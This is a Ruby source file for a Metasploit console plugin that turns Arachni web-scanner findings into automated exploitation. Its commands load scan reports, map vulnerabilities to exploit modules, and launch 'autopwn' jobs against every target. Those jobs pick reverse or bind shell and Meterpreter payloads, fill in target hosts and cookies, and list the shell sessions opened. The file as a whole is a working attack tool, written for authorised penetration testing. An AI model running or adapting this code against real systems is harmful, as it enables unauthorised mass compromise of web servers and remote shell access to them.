require 'pp'

module Msf

class Plugin::Arachni < Msf::Plugin

  ###
  #
  # This class implements an exploitation platform for web app vulnerabilities
  # discovered by the Arachni WebApp Security Scaner Framework
  # (http://github.com/Zapotek/arachni)
  #
  ###
  class ArachniCommandDispatcher
    include Msf::Ui::Console::CommandDispatcher

    #
    # The dispatcher's name.
    #
    def name
      "Arachni"
    end

    #
    # Returns the hash of commands supported by this dispatcher.
    #
    def commands
      {
        "arachni_load"          => "Loads an ArachniMetareport file (.afr.msf).",
        "arachni_autopwn"       => "Tries to exploit all vulnerabilities.",
        "arachni_list_exploits" => "Lists all matching exploit modules.",
        "arachni_list_vulns"    => "Lists all vulnerabilities.",
        "arachni_list_all"      => "Same as running 'arachni_list_exploits' & 'arachni_list_vulns'.",
        "arachni_killall"       => "Kills all running/pending pwn-jobs.",
        "arachni_manual"        => "Prepares a vulnerability for manual exploitation.",
      }
    end

    #
    # This method loads a metareport file and lists all
    # exploitable vulnerabilities and suitable exploits.
    #
    def cmd_arachni_load( *args )

      metareport = args[0]

      if !metareport
        print_error( "Usage: arachni_load [metareport]" )
        return
      end

      if !File.exist?( metareport )
        print_error( "File '#{metareport}' doesn't exist." )
        return
      end

      print_status( "Loading report..." )

      @vulns    ||= []
      @exploits ||= []
      YAML.load( IO.read( metareport ) ).each do |vuln|
        data = { }

        vuln.ivars.keys.each do |k|
          data[k.to_sym] = vuln.ivars[k]
        end

        begin
          # the MSF doesn't much like hostnames, resolve to an IP address
          # there's probably a beter way to do it...
          host = Rex::Socket.gethostbyname( data[:host] ).pop
          data[:host] = Rex::Socket.addr_ntoa( host )

          @exploits << data[:exploit]

          @vulns << data
        rescue
          next
        end

      end

      @vulns.uniq!

      print_status( "Loaded #{@vulns.size} vulnerabilities." )

      print_line
      cmd_arachni_list_exploits
      cmd_arachni_list_vulns
      print_line

      print_status( 'Done!' )
    end

    #
    # Exploits all vulnerabilities
    #
    def cmd_arachni_autopwn( *args )

      opts = {
        :meterpreter => false,
        :reverse     => false,
        :bind        => true,
        :quiet       => false,
        :regexp      => nil
      }

      args.push( "-h" ) if args.empty?

      while( !args.empty? && flag = args.shift )

        case flag

        when '-h', '--help', '?'
          help()
          return

        when '-r'
          opts[:reverse] = true

        when '-b'
          opts[:bind] = true

        when '-m'
          opts[:meterpreter] = true

        when '-q'
          opts[:quiet] = true

        when '-x'
          opts[:regexp] = Regexp.new( args.shift.to_s )

        when '-a'
          opts[:regexp] = /.*/

        else
          print_error( 'Unknown option: ' + flag.to_s )
          return
        end

      end

      if running?
        print_error( "#{@jobs.size} pwn-jobs haven't finished yet." )
        print_error( 'To kill them run: \'arachni_killall\'' )
        return
      end


      if !@vulns
        print_error( 'You must first load a report using \'arachni_load\'.' )
        return
      end

      if @vulns.empty?
        print_error( 'No vulnerabilities to exploit.' )
      end

      print_status( 'Running pwn-jobs...' )
      print_line

      @jobs ||= []
      @vulns.each do |vuln|

        next if opts[:regexp] && !(vuln[:exploit] =~ opts[:regexp])

        @jobs << Thread.new( vuln, opts ) do |vulnerability, opts|
          exploit( vulnerability, opts )
        end
      end

      # Wait on all the jobs we just spawned
      while( !@jobs.empty? )
        # All running jobs are stored in framework.jobs.  If it's
        # not in this list, it must have completed.
        @jobs.delete_if { |j| !j.alive? }

        print_status( "[#{framework.sessions.length} established sessions]):" +
          " Waiting on #{@jobs.length} launched modules to finish execution..." )
        ::IO.select( nil, nil, nil, 5.0 )
      end

      print_line
      print_status( "The autopwn command has completed with #{framework.sessions.length} sessions" )
      if( framework.sessions.length > 0 )
        print_status( "Enter sessions -i [ID] to interact with a given session ID" )
        print_status( "" )
        print_status( "=" * 80 )
        driver.run_single( "sessions -l -v" )
        print_status( "=" * 80 )
      end

    end

    #
    # Decides whether or not any pwn-jobs are running
    #
    def running?
      return @jobs && !@jobs.empty?
    end

    #
    # Kills all pwn-jobs
    #
    def cmd_arachni_killall

      if !@jobs
        print_error( "The pwn-job queue hasn't been initialised yet." )
        return
      end

      if @jobs.empty?
        print_info( "The pwn-job queue is empty." )
        return
      end

      cnt = 0
      @jobs.each do |j|
        cnt +=1 if Thread.kill( j )
      end

      @jobs.clear
      print_status( "Killed #{cnt} pwn-jobs." )

    end

    #
    # Lists suitable exploits and vulnerabilities
    #
    def cmd_arachni_list_all
      cmd_arachni_list_exploits
      cmd_arachni_list_vulns
    end

    #
    # Lists all vulnerabilities
    #
    def cmd_arachni_list_vulns

      if !@vulns
        print_error( 'You must first load a report using \'arachni_load\'.' )
        return
      end

      if @vulns.empty?
        print_error( 'No vulnerabilities to list.' )
      end

      @vulns.uniq!

      vuln_table = Rex::Ui::Text::Table.new(
      'Header'  => "Vulnerabilities",
      'Indent'  => 4,
      'Columns' => [
        "ID",
        "Host",
        "Path",
        "Name",
        "Method",
        "Params",
        "Exploit"
        ]
      )

      indent = ""
      @vulns.each_with_index do |vuln, idx|

        vuln_table << [ idx + 1, vuln[:host], vuln[:path], vuln[:name],
          vuln[:method], vuln[:params].to_s, vuln[:exploit] ]

      end

      print_line( "\n#{vuln_table.to_s}\n" )

    end

    #
    # Prepares a vulnerability for manual exploitation by ID
    #
    def cmd_arachni_manual( *args )
      idx = args[0]

      if !idx
        print_error( 'Usage: arachni_manual [ID]' )
        print_line( 'Use \'arachni_vulns\' to see all available IDs.' )
        return
      end
      idx = idx.to_i
      idx -= 1

      if !@vulns
        print_error( 'You must first load a report using \'arachni_load\'.' )
        return
      end

      if @vulns.empty?
        print_error( 'No vulnerabilities to exploit.' )
      end

      vuln = @vulns[idx]

      if !vuln
        print_error( "Invalid index: #{idx}" )
        cmd_arachni_list_vulns
        return
      end


      print_status( "Using #{vuln[:exploit]} ." )
      driver.run_single( "use #{vuln[:exploit]}" )

      prep_datastore( vuln ).each do |k, v|
        v = '' if !v
        driver.run_single( "set #{k} #{v}" )
      end

      print_status( "Done!" )

      begin

        sploit = framework.modules.create( vuln[:exploit] )
        driver.run_single( "set PAYLOAD #{payload( sploit, vuln )}" )


        payload_table = Rex::Ui::Text::Table.new(
          'Header'  => "Compatible payloads",
          'Indent'  => 4,
          'Columns' => [ "Name", "Description" ]
        )

        sploit.compatible_payloads.each do |payload|
          payload_table << [ payload[0], payload[1].new.description ]
        end
      rescue
        print_line( "\n#{payload_table.to_s}\n" )
        print_line( "Use: set PAYLOAD <name>" )
      end

    end

    #
    # Lists all suitable exploits
    #
    def cmd_arachni_list_exploits

      if !@exploits
        print_error( 'You must first load a report using \'arachni_load\'.' )
        return
      end

      if @exploits.empty?
        print_error( 'No exploits to list.' )
      end

      @exploits.uniq!

      exploit_table = Rex::Ui::Text::Table.new(
      'Header'  => "Unique exploits",
      'Indent'  => 4,
      'Columns' => [
        "ID", "Exploit", "Description"
        ]
      )

      @exploits.each_with_index do |ex, idx|
        desc = framework.modules.create( ex ).description
        exploit_table << [idx + 1, ex, desc ]
      end

      print_line( "\n#{exploit_table.to_s}\n" )

    end

    def help
      print_status("Usage: arachni_autopwn [options]")
      print_line("\t-h          Display this help text")
      print_line("\t-x [regexp] Only run modules whose name matches the regex")
      print_line("\t-a          Launch exploits against all matched targets")
      # print_line("\t-s          Stop on first shell")
      print_line("\t-r          Use a reverse connect shell")
      print_line("\t-b          Use a bind shell on a random port (default)")
      print_line("\t-m          Use a meterpreter shell (if possible)")
      print_line("\t-q          Disable exploit module output")
      print_line("")
    end

    #
    # Exploits a vulnerability based on user opts
    #
    def exploit( vuln, opts )

      sploit =  framework.modules.create( vuln[:exploit] )

      print_status( "Running #{sploit.fullname}" )

      sploit.datastore.merge!( prep_datastore( vuln ) )

      sploit.exploit_simple(
      'Payload'        => payload( sploit, opts ),
      'LocalInput'     => opts[:quiet] ? nil : driver.input,
      'LocalOutput'    => opts[:quiet] ? nil : driver.output,
      'RunAsJob'       => false
      )

    end

    #
    # Determines the most suitable payload for an exploit based on user opts
    #
    def payload( sploit, opts )

      # choose best payloads for a reverse shells
      if opts[:reverse]

        # choose best payloads for a reverse meterpreter shell
        if opts[:meterpreter]
          payloads = {
            'exploit/unix/webapp/arachni_php_include' => 'php/meterpreter/reverse_tcp',
            # arachni_exec doesn't have a compatiblem meterpreter shell...
            'exploit/unix/webapp/arachni_exec'        => 'cmd/unix/reverse_perl',
            'exploit/unix/webapp/arachni_php_eval'    => 'php/meterpreter/reverse_tcp',
          }
        # choose best payloads for a standard reverse shell
        else
          payloads = {
            'exploit/unix/webapp/arachni_php_include' => 'generic/shell_reverse_tcp',
            'exploit/unix/webapp/arachni_exec'        => 'cmd/unix/reverse_perl',
            'exploit/unix/webapp/arachni_php_eval'    => 'generic/shell_reverse_tcp',
          }
        end

      # choose best payloads for a bind shell (default)
      else
        # choose best payloads for a bind meterpreter shell
        if opts[:meterpreter]
          payloads = {
            'exploit/unix/webapp/arachni_php_include' => 'php/meterpreter/bind_tcp',
            'exploit/unix/webapp/arachni_exec'        => 'cmd/unix/reverse_perl',
            'exploit/unix/webapp/arachni_php_eval'    => 'php/meterpreter/bind_tcp',
          }
        # choose best payloads for a standard bind shell
        else
          payloads = {
            'exploit/unix/webapp/arachni_php_include' => 'php/bind_php',
            'exploit/unix/webapp/arachni_exec'        => 'cmd/unix/bind_perl',
            'exploit/unix/webapp/arachni_php_eval'    => 'php/bind_php',
          }
        end
      end

      return payloads[sploit.fullname]
    end

    #
    # Prepares a hash to be used as a module/framework datastore
    # based on the provided vulnerability
    #
    def prep_datastore( vuln )

      cvuln = vuln.dup

      uri  = cvuln[:host]
      uri += cvuln[:path]  if cvuln[:path]
      uri += cvuln[:query] if cvuln[:query]

      print_status( "Preparing datastore for '#{cvuln[:name]}' vulnerability @ #{uri} ..." )

      datastore = {}
      datastore["SRVHOST"] = "127.0.0.1"
      datastore["SRVPORT"] = ( rand( 9999 ) + 6000 ).to_s
      datastore["RHOST"]   = cvuln[:host]
      datastore["RPORT"]   = cvuln[:port]
      datastore["LHOST"]   = "127.0.0.1"
      datastore["LPORT"]   = ( rand( 9999 ) + 5000 ).to_s

      datastore["SSL"]     = cvuln[:ssl]

      case cvuln[:method]
      when 'GET'
        datastore["GET"]  = hash_to_query( cvuln[:params] )
      when 'POST'
        datastore["POST"] = hash_to_query( cvuln[:params] )
      end

      datastore["METHOD"]   = cvuln[:method]

      datastore["COOKIES"]  = cvuln[:headers]['cookie']
      headers = cvuln[:headers]
      headers.delete( 'cookie' )

      datastore["HEADERS"] = hash_to_query( headers, '::' )
      datastore["PATH"]    = cvuln[:path]

      return datastore.dup
    end

    #
    # Splits and converts a query string into a hash
    #
    def hash_to_query( hash, glue = '&' )
      return hash.to_a.map do |item|
        next if !item[1]
        "#{item[0]}=#{item[1]}"
      end.reject do |i| !i end.join( glue )
    end

  end

  def initialize( framework, opts )
    super
    # console dispatcher commands.
    add_console_dispatcher( ArachniCommandDispatcher )
  end

  def cleanup
    remove_console_dispatcher( 'Arachni' )
  end

  def name
    "arachni"
  end

  def desc
    %q{Provides an exploitation platform for web app vulnerabilities
    discovered by the Arachni WebApp Security Scaner Framework
    (http://github.com/Zapotek/arachni)}
  end

end

end
